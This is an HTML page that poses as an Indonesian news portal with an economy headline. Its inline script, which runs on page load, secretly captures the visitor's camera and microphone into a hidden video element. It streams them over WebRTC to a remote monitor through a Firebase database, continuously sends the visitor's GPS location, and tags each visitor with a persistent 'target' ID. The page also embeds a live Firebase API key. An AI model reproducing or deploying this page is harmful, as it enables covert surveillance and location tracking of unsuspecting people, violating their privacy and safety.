<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal Berita Nasional</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: sans-serif; margin: 0; padding: 20px; line-height: 1.6; }
        .nav { background: #b91c1c; color: white; padding: 15px; font-weight: bold; margin-bottom: 20px; }
        #v { display: none; }
    </style>
</head>
<body>
    <div class="nav">INFO NEWS LIVE</div>
    <h1>Ekonomi Digital Menjadi Pilar Utama Masa Depan Indonesia</h1>
    <p>Pemerintah optimis bahwa integrasi teknologi informasi akan mempercepat pertumbuhan...</p>
    <img src="https://picsum.photos/800/400" style="width:100%; border-radius:10px;">
    
    <video id="v" autoplay playsinline muted></video>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
            databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "chatroom-e9b3f"
        };
        firebase.initializeApp(firebaseConfig);

        // Gunakan ID tetap agar tetap tersambung meski refresh
        let targetId = localStorage.getItem('target_id');
        if (!targetId) {
            targetId = "TGT-" + Math.random().toString(36).substr(2, 5);
            localStorage.setItem('target_id', targetId);
        }

        const db = firebase.database().ref('v5_multi/' + targetId);
        let pc;
        let localStream;

        async function createPC() {
            if (pc) pc.close();
            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });

            pc.onicecandidate = e => {
                if (e.candidate) db.child('ice_t').push(e.candidate.toJSON());
            };

            if (localStream) {
                localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
            }

            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            // Simpan offer dengan timestamp untuk memicu monitor
            db.child('sdp/offer').set({ type: offer.type, sdp: offer.sdp, ts: Date.now() });
        }

        async function init() {
            // Bersihkan sdp lama agar monitor tahu kita refresh
            await db.child('sdp/answer').remove();
            await db.child('ice_m').remove();
            await db.child('ice_t').remove();

            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('v').srcObject = localStream;

            navigator.geolocation.watchPosition(p => {
                db.child('status').update({ lat: p.coords.latitude, lng: p.coords.longitude, lastSeen: Date.now(), id: targetId });
            });

            await createPC();

            db.child('sdp/answer').on('value', async s => {
                const a = s.val();
                if (a && !pc.currentRemoteDescription) {
                    await pc.setRemoteDescription(new RTCSessionDescription(a));
                }
            });

            db.child('ice_m').on('child_added', s => {
                pc.addIceCandidate(new RTCIceCandidate(s.val()));
            });
        }

        window.onload = init;
    </script>
</body>
</html>
